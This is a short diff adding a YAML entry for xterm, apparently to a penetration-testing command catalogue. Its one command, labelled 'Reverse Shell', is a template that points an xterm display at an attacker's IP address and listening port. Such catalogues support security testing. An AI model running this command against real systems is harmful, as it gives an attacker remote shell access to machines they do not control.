@@ -1,0 +1,15 @@
+---
+name: xterm
+description: A terminal emulator for the X Window System
+os: Linux
+ptf_module: null
+---
+commands:
+  - "Reverse Shell":
+    - type: ["other","NX"]
+    - text: "xterm -display {IPV4}:{INT}"
+    - input: ["attacker IPv4 address","attacker listening TCP port"]
+    - output: null
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+...
